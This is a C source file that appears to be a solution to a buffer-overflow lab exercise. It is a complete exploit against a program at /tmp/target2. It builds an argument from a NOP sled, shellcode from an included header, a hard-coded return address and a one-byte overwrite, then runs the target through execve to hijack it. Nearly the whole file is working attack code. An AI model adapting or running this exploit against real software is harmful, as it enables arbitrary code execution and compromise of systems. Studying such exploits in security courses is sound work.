#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET;

  args[1] = malloc(202);
  memset(args[1], 0x90, 201); // 0x90 is NOP in x86 assembly. We cannot leave nulls in our string.
  args[1][201] = '\0'; // NULL terminate the string.
  memcpy(args[1], shellcode, strlen(shellcode)); // shellcode provided in shellcode.h

  *(unsigned int *)(args[1] + 196) = 0xbffffce4;

  args[1][200] = '\xa4';
  
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
